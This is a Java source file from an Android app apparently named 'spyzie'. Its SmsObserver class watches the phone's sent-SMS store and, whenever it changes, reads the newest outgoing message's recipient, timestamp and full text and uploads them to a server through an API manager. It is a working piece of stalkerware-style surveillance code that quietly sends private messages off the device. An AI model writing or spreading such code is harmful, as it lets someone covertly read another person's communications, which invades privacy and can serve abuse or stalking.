package com.tantd.spyzie.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.AppApiManager;

public class SmsObserver extends ContentObserver {

    private String lastSmsId;
    private Context mContext;

    public SmsObserver(Handler handler, Context context) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Uri smsUri = Uri.parse("content://sms/sent");
        Cursor cursor = mContext.getContentResolver().query(smsUri, null, null, null, null);
        if (cursor.moveToNext()) {
            String id = cursor.getString(cursor.getColumnIndex("_id"));
            if (!id.equals(lastSmsId)) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String time = cursor.getString(cursor.getColumnIndex("date"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                lastSmsId = id;
                AppApiManager.getInstance().sendSmsData(new Sms(id, address, time, body, false));
            }
        }
    }
}
